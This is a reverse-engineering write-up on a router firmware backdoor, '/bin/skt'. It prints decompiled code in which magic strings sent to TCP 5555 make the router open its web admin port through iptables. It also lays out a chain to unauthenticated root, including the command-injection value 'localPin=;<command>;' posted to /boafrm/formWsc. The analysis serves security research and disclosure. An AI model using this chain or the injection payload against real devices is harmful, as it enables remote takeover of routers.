# `/bin/skt` — the 2015 backdoor, decoded

W01 established that V2.1.2 ships `/bin/skt`, that `/etc/init.d/rcS` line 110
reads `#skt&` — the autostart commented out, the binary left executable — and
that V3.4.0 removes the binary entirely. What it did was inferred from Pierre
Kim's 2015 advisory, not from the binary.

This reads the binary. It is 10,204 bytes, 36 functions,
SHA-256 `1c09aa9f…8363`, and it is small enough to understand completely.

## What it is

```c
int main(int argc, char **argv)
{
    if (argc == 1) {                       /* server mode: no arguments */
        TcpServer(0x15b3, 0xe10);          /* 0x15b3 = 5555 */
        return 0;
    }
    if (argc == 3) {                       /* client mode */
        int cmd = **(char **)(argv + 1) - 0x30;
        if (cmd < 0 || cmd > 3) return -2;
        TcpClient(argv[1], cmd, 0x15b3);
        return 0;
    }
    puts("server: skt;  client: skt host cmd");
    return -1;
}
```

`skt` with no arguments listens on **TCP 5555**. The same binary is also the
client, which is why a single-digit command index is all the protocol carries.

## The protocol

Four magic strings, recovered from the binary:

```
gvr,xasf
hel,xasf
oki,xasf
bye,xasf
```

and the dispatcher that consumes them:

```c
void handle(int sock, char *msg, size_t len)
{
    if (strcmp(msg, "hel,xasf") == 0)
        system("iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
    else if (strcmp(msg, "oki,xasf") == 0)
        system("iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
    send(sock, msg, len, 0);
}
```

The four command indices in `main` map onto the four magic strings; `hel` and
`oki` are the two with side effects.

## What it does, plainly

`hel,xasf` sent to TCP 5555 **inserts a firewall rule accepting inbound TCP 80
on `eth1`**. `oki,xasf` removes it again. Both run as root, because everything
on this device does.

`eth1` is the interface the rule names. On this board layout that is the WAN
side — but that is read off the rule, not verified on hardware, and confirming
it is a W02 task. Stated carefully: **this opens the router's administrative web
interface on an interface it is otherwise firewalled off from.**

It is worth being precise about what kind of backdoor this is. It does not
itself give a shell, and it does not bypass a password. It is a *reachability*
backdoor: it takes an admin interface that was deliberately not exposed and
exposes it.

## Why that matters more than it looks

On its own, opening port 80 to the WAN is bad but bounded — an attacker still
faces a login page. Combined with what W03 found in `boa`, it is not bounded at
all.

[`auth-flow.md`](auth-flow.md) establishes that the only authorisation gate in
Boa's request path runs **only when the request URI contains the substring
`htm`**. Every `/boafrm/form*` endpoint — all 59 of them, including
`formPasswordSetup` and `formSaveConfig` — is therefore outside the gate.

So the 2015 chain, entirely from static analysis:

```
1. TCP 5555, send "hel,xasf"          -> iptables opens :80 on eth1
2. POST /boafrm/formWsc               -> no "htm" in the URI, no auth check
   localPin=;<command>;                  -> sprintf into a shell string
                                         -> system(), as root
```

Two independent defects, each shipped by the vendor, that compose into
unauthenticated remote root.

## The part that is actually the story

`skt` is not running. `rcS` line 110 is `#skt&`.

The V2.1.2 image is dated **2015-08-25**, roughly five weeks after Pierre Kim's
July 2015 disclosure. The vendor's response to a published backdoor was to
comment out the line that starts it, and ship the binary anyway — executable, in
`/bin`, on a device whose web interface has the command-execution paths above.

Anything that can run one command can run `/bin/skt &`.

That is the difference between *removing* a backdoor and *not starting* one, and
it is measurable here rather than rhetorical: V3.4.0, five years later, deletes
the file. The vendor eventually did the right thing; in 2015 they did the cheap
one.

## Not established

- **That `eth1` is WAN on this unit.** Read from the iptables rule. W02.
- **Whether anything else starts `skt`.** Only `rcS` was checked; the other init
  paths, `rcS_32M` in particular, have not been read line by line.
- **What `gvr,xasf` and `bye,xasf` do.** Neither has a side effect in the
  dispatcher that was read; they are presumably handshake and close. The
  `TcpServer` timeout argument `0xe10` (3600) has not been chased either.
